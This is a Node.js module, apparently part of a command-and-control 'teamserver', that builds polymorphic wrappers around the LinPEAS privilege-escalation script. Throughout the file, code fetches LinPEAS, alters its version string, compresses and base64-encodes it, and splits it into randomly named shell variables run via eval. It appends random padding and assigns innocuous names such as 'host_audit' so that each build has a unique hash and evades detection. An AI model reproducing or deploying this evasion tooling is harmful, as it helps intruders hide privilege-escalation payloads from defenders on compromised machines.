/**
 * Polymorphic LinPEAS shell builder — unique wrapper + stamp each generation.
 */
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');
const https = require('https');
const http = require('http');
const { URL } = require('url');
const {
  randomId,
  readManifest,
  writeManifest,
  BUILDS_DIR,
} = require('./polymorph');

const ROOT = path.join(__dirname, '..');
const LINPEAS_CACHE_DIR = path.join(ROOT, 'builder', 'templates');
const LINPEAS_CACHE_FILE = path.join(LINPEAS_CACHE_DIR, 'linpeas.sh');

const LINPEAS_DOWNLOAD_URLS = [
  process.env.LINPEAS_URL,
  'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh',
  'https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh',
].filter(Boolean);

let linpeasFetchPromise = null;

function resolveLinpeasSrc() {
  const candidates = [
    process.env.LINPEAS_SRC,
    path.join(ROOT, 'linpeas.sh'),
    path.join(ROOT, 'builder', 'templates', 'linpeas.sh'),
    path.join(__dirname, 'templates', 'linpeas.sh'),
  ].filter(Boolean);
  for (const p of candidates) {
    const abs = path.resolve(String(p).trim());
    if (fs.existsSync(abs) && fs.statSync(abs).isFile()) return abs;
  }
  return null;
}

function linpeasSourceHint(extra) {
  const expected = path.resolve(path.join(ROOT, 'linpeas.sh'));
  let msg =
    'linpeas.sh not found on teamserver. The server will try to download it automatically; if that fails:\n' +
    `  • Copy linpeas.sh to ${expected}\n` +
    `  • Or ${LINPEAS_CACHE_FILE}\n` +
    '  • Or set LINPEAS_SRC or LINPEAS_URL and restart Node.\n' +
    '  • Ensure outbound HTTPS to GitHub is allowed.';
  if (extra) msg += `\n\n${extra}`;
  return msg;
}

function looksLikeLinpeas(buf) {
  if (!buf || buf.length < 50000) return false;
  const head = buf.slice(0, 4000).toString('utf8');
  if (/^\s*</.test(head) || head.includes('<!DOCTYPE') || head.includes('<html')) return false;
  return /^#!\/|linpeas|linPEAS|PEASS/i.test(head);
}

function fetchUrlBytes(url, redirectsLeft = 6) {
  return new Promise((resolve, reject) => {
    let parsed;
    try {
      parsed = new URL(url);
    } catch (e) {
      reject(e);
      return;
    }
    const lib = parsed.protocol === 'https:' ? https : http;
    const req = lib.get(
      url,
      {
        headers: {
          'User-Agent': 'fahis-linpeas-builder/1.0',
          Accept: '*/*',
        },
      },
      (res) => {
        if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
          if (redirectsLeft <= 0) {
            res.resume();
            reject(new Error('Too many redirects'));
            return;
          }
          const next = new URL(res.headers.location, url).href;
          res.resume();
          fetchUrlBytes(next, redirectsLeft - 1).then(resolve, reject);
          return;
        }
        if (res.statusCode !== 200) {
          res.resume();
          reject(new Error(`HTTP ${res.statusCode}`));
          return;
        }
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => resolve(Buffer.concat(chunks)));
      }
    );
    req.on('error', reject);
    req.setTimeout(180000, () => {
      req.destroy(new Error('Download timeout'));
    });
  });
}

async function downloadLinpeasToCache() {
  fs.mkdirSync(LINPEAS_CACHE_DIR, { recursive: true });
  let lastErr = null;
  for (const url of LINPEAS_DOWNLOAD_URLS) {
    try {
      console.log(`[LINPEAS] Fetching source: ${url}`);
      const buf = await fetchUrlBytes(url);
      if (!looksLikeLinpeas(buf)) {
        throw new Error('Response is not a valid linpeas.sh script');
      }
      fs.writeFileSync(LINPEAS_CACHE_FILE, buf);
      try {
        fs.chmodSync(LINPEAS_CACHE_FILE, 0o644);
      } catch (_) {}
      console.log(`[LINPEAS] Cached ${buf.length} bytes at ${LINPEAS_CACHE_FILE}`);
      return LINPEAS_CACHE_FILE;
    } catch (e) {
      lastErr = e;
      console.warn(`[LINPEAS] Fetch failed (${url}): ${e.message}`);
    }
  }
  throw new Error(lastErr ? lastErr.message : 'All download URLs failed');
}

async function ensureLinpeasSrc() {
  const existing = resolveLinpeasSrc();
  if (existing) return existing;
  if (process.env.LINPEAS_AUTO_FETCH === '0' || process.env.LINPEAS_AUTO_FETCH === 'false') {
    throw new Error(linpeasSourceHint('Auto-download disabled (LINPEAS_AUTO_FETCH=0).'));
  }
  if (!linpeasFetchPromise) {
    linpeasFetchPromise = downloadLinpeasToCache().finally(() => {
      linpeasFetchPromise = null;
    });
  }
  try {
    return await linpeasFetchPromise;
  } catch (e) {
    throw new Error(linpeasSourceHint(`Auto-download failed: ${e.message}`));
  }
}

const LINUX_ENUM_NAMES = [
  'host_audit',
  'sys_enum',
  'local_checks',
  'priv_review',
  'linux_scan',
];

function randomIdent(prefix) {
  const n = crypto.randomBytes(4).toString('hex');
  return `${prefix}_${n}`;
}

function chunkString(s, minLen, maxLen) {
  const parts = [];
  let i = 0;
  while (i < s.length) {
    const len = minLen + (crypto.randomBytes(1)[0] % (maxLen - minLen + 1));
    parts.push(s.slice(i, i + len));
    i += len;
  }
  return parts;
}

function buildWrapper(gzB64, stamp) {
  const chunks = chunkString(gzB64, 48, 96);
  const dataVar = randomIdent('d');
  const fnDecode = randomIdent('f');
  const fnRun = randomIdent('r');
  const partVars = chunks.map(() => randomIdent('p'));

  const assigns = partVars.map((v, i) => `${v}='${chunks[i]}'`).join('\n');
  const concat = partVars.map((v) => `\${${v}}`).join('');

  return `#!/bin/sh
# ${stamp}
# ${crypto.randomBytes(24).toString('hex')}
${assigns}
${dataVar}="${concat}"
${fnDecode}() {
  _t=$(mktemp 2>/dev/null || echo "/tmp/.${stamp.slice(0, 8)}")
  printf '%s' "\${${dataVar}}" | tr -d '\\n' | base64 -d 2>/dev/null | gzip -dc 2>/dev/null > "$_t" || return 1
  cat "$_t"
  rm -f "$_t" 2>/dev/null
}
${fnRun}() {
  eval "$(${fnDecode})"
}
${fnRun}
`;
}

function mutateLinpeasSource(text, stamp) {
  let out = text;
  const tag = stamp.slice(0, 12);
  out = out.replace(/VERSION="[^"]*"/, `VERSION="ng_${tag}"`);
  const inject = `# poly_build:${stamp}\n# ${crypto.randomBytes(16).toString('hex')}\n`;
  if (/^#!\/[^\n]*\n/.test(out)) {
    out = out.replace(/^#!\/[^\n]*\n/, (m) => m + inject);
  } else {
    out = inject + out;
  }
  return out;
}

function defaultLinpeasName() {
  const base = LINUX_ENUM_NAMES[crypto.randomBytes(1)[0] % LINUX_ENUM_NAMES.length];
  return `${base}_${crypto.randomBytes(3).toString('hex')}`;
}

async function generateLinpeasBuild(options = {}) {
  const linpeasPath = resolveLinpeasSrc() || (await ensureLinpeasSrc());
  if (!linpeasPath) {
    throw new Error(linpeasSourceHint());
  }

  const id = randomId();
  const stamp = crypto.randomBytes(32).toString('hex');
  const buildid = crypto.randomBytes(16).toString('hex');

  const raw = fs.readFileSync(linpeasPath, 'utf8');
  const mutated = mutateLinpeasSource(raw, stamp);
  const gz = zlib.gzipSync(Buffer.from(mutated, 'utf8'), { level: 9 });
  const gzB64 = gz.toString('base64');

  let wrapper = buildWrapper(gzB64, stamp);
  wrapper += `\n# tail:${crypto.randomBytes(128 + (crypto.randomBytes(1)[0] % 384)).toString('hex')}\n`;

  const workDir = path.join(BUILDS_DIR, id);
  fs.mkdirSync(workDir, { recursive: true });

  const baseName = (options.outputName || defaultLinpeasName()).replace(/[<>:"/\\|?*\s]/g, '_');
  const outName = baseName.endsWith('.sh') ? baseName : `${baseName}.sh`;
  const outPath = path.join(workDir, outName);

  fs.writeFileSync(outPath, wrapper, { mode: 0o755 });

  const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');
  const stat = fs.statSync(outPath);

  const meta = {
    id,
    platform: 'linux',
    arch: String(options.arch || 'amd64'),
    variant: 'linpeas',
    tool: 'linpeas-sh',
    format: 'sh',
    fileName: outName,
    size: stat.size,
    sha256,
    stamp: stamp.slice(0, 16),
    buildid,
    sourceBytes: Buffer.byteLength(mutated, 'utf8'),
    gzipBytes: gz.length,
    injectDllPacked: false,
    createdAt: new Date().toISOString(),
  };

  fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
  const list = readManifest();
  list.unshift(meta);
  writeManifest(list.slice(0, 100));
  return meta;
}

module.exports = {
  generateLinpeasBuild,
  resolveLinpeasSrc,
  ensureLinpeasSrc,
  linpeasSourceHint,
};
